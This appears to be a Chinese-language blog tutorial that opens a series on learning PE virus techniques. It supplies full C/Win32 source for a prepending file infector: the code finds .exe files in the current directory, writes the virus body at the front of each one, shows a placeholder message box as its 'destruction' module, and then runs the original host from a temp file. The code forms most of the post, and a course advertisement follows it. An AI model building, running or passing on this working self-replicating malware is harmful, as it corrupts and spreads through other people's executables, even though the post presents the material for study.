
# PE病毒学习(一、二、三、四、五、六、七、八）

欢迎来我的主页`e92K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6Q4x3X3g2U0M7$3c8F1i4K6u0W2L8X3g2@1i4K6u0r3P5h3q4F1k6$3u0G2M5%4c8S2M7W2)9J5c8R3.`

历史上，在windows95发布后，用高级语言编写的外壳病毒，经过简单地改造编译，就能从DOS平台迁移到windows平台上。

并且在这当中很多“前置病毒”，仅仅需要重新编译。

另外之所以用“前置病毒”作为第一分析样本，理由如下：

1. 它具有基本病毒功能模块，这些模块在文件型病毒中是通用的
2. 其框架结构，所需病毒技巧极少
3. 拓展方便，通过不断地加入新功能，循序渐进的学习各种病毒技巧
4. 加载新模块方便，适合测试其它病毒的某些功能模块

文件型病毒至少有这四个模块：

1. 条件模块：判断触发条件和寻找符合条件的宿主文件
2. 破坏模块：
3. 感染模块：
4. 宿主程序引导模块：将病毒的控制权移交给所触发病毒文件的宿主程序

## 样例

### 1. 条件模块

功能：搜索病毒文件所在目录中，规定数目的`exe`文件

```
//打开符合条件的文件
HANDLE OpenHostFile(const WIN32_FIND_DATA *pHost,DWORD *nCount)
{
    HANDLE hHost=CreateFile(pHost->cFileName,
       GENERIC_READ|GENERIC_WRITE,
       FILE_SHARE_READ|FILE_SHARE_WRITE,
       0,
       OPEN_EXISTING,
       NULL,
       NULL);
    if(hHost!=INVALID_HANDLE_VALUE)
        (*nCount)++;
    return hHost;
}

//搜索函数
DWORD FindHostFile(HANDLE *szHostFileHandle,DWORD dwFindNumber)
{
    DWORD dwResult=0;
    WIN32_FIND_DATA fd;
    HANDLE hFirst=FindFirstFile(_T("*.exe"),&fd);
    szHostFileHandle[0]=OpenHostFile(&fd,&dwResult);
    while(dwResult<dwFindNumber)
    {
        DWORD dwTemp=dwResult;
        if(FindNextFile(hFirst,&fd))
        {
            HANDLE hTemp=OpenHostFile(&fd,&dwResult);
            if(INVALID_HANDLE_VALUE!=hTemp)
                szHostFileHandle[dwTemp]=hTemp;
        }
        else
            break;
    }
    return dwResult;
}
```

### 2. 感染模块

功能：将病毒文件注入宿主文件，将原宿主文件向后移动

```
//定义病毒大小，使用全局变量是因为其它模块也要用到，53248是代码在VC2005 Debug模式下的生成文件大小,但并非都是这样，请自行确定，如果大小错误，那么感染后的文件运行会出错。
DWORD dwVirusSize=40960;
//感染模块
void Infect(HANDLE hHostFile,HANDLE hLocalFile)
{
    DWORD dwHostSize=GetFileSize(hHostFile,0);
    DWORD dwReadSize=0;
    DWORD dwWriteSize=0;
    char *pLocalTempBuf=(char*)malloc(sizeof(char)*dwVirusSize);
    char *pHostTempBuf=(char*)malloc(sizeof(char)*dwHostSize);
    ReadFile(hLocalFile,pLocalTempBuf,dwVirusSize,&dwReadSize,NULL);
    ReadFile(hHostFile,pHostTempBuf,dwHostSize,&dwReadSize,NULL);
    SetFilePointer(hHostFile,0,0,FILE_BEGIN);
    WriteFile(hHostFile,pLocalTempBuf,dwVirusSize,&dwWriteSize,NULL);
    WriteFile(hHostFile,pHostTempBuf,dwHostSize,&dwWriteSize,NULL);
    //清理工作
    SetFilePointer(hLocalFile,0,0,FILE_BEGIN);
    free(pLocalTempBuf);
    free(pHostTempBuf);
}
```

### 3. 破坏模块

功能：仅仅打印提示。

```
VOID Destory()
{
    MessageBox(NULL,_T("我保证什么都不做"),_T("Test"),MB_OK);
}
```

### 4. 宿主程序引导模块

功能：创建临时文件，将所触发的病毒文件的宿主程序写入，然后启动

```
VOID JumpLocalHostFile(HANDLE hLocalFile)
{
    DWORD nCount=0;
    DWORD dwLocalFileSize=GetFileSize(hLocalFile,0);
    if(dwLocalFileSize==dwVirusSize)
        return ;
    char *pTemp=(char*)malloc(sizeof(char)*(dwLocalFileSize-dwVirusSize));
    ReadFile(hLocalFile,pTemp,(dwLocalFileSize-dwVirusSize),&nCount,NULL);
    TCHAR szLocalPath[MAX_PATH];
    TCHAR szTempPath[MAX_PATH];
    TCHAR szTempName[50];
    GetModuleFileName(NULL,szLocalPath,sizeof(szLocalPath));
    GetTempPath(MAX_PATH,szTempPath);
    GetFileTitle(szLocalPath,szTempName,50);
    wcscat(szTempPath,szTempName);
    HANDLE hJumpHost=CreateFile(szTempPath,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ,0,CREATE_NEW,NULL,NULL);
    if(hJumpHost==INVALID_HANDLE_VALUE)
        return ;
    WriteFile(hJumpHost,pTemp,(dwLocalFileSize-dwVirusSize),&nCount,NULL);
    free(pTemp);
    CloseHandle(hJumpHost);
    PROCESS_INFORMATION information;
    STARTUPINFO si = {sizeof(si)};
    if(CreateProcess(szTempPath,NULL,
          NULL,NULL,
          FALSE,NORMAL_PRIORITY_CLASS,
          NULL,NULL,
          &si,&information))
    {
        WaitForSingleObject(information.hProcess,INFINITE);
        DeleteFile(szTempPath);
    }
}
```

### 5. 程序入口

```
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <Commdlg.h>

int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
    TCHAR szLocalPath[MAX_PATH];
    GetModuleFileName(NULL,szLocalPath,sizeof(szLocalPath));
    HANDLE hLocalFileHandle=CreateFile(szLocalPath,
       GENERIC_READ,
       FILE_SHARE_READ,
       0,
       OPEN_EXISTING,
       NULL,
       NULL);
    HANDLE szHostHandle[3];
    DWORD dwFoundFileNumber=FindHostFile(szHostHandle,3);
    Destory();
    for(DWORD i=0;i<dwFoundFileNumber;i++)
    {
        Infect(szHostHandle[i],hLocalFileHandle);
        CloseHandle(szHostHandle[i]);
    }
    JumpLocalHostFile(hLocalFileHandle);
    CloseHandle(hLocalFileHandle);
    return 0;
}
```

后面几章，我们将逐渐优化这段代码，加入新功能，来学习病毒技巧，为将来的PE病毒打基础。

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
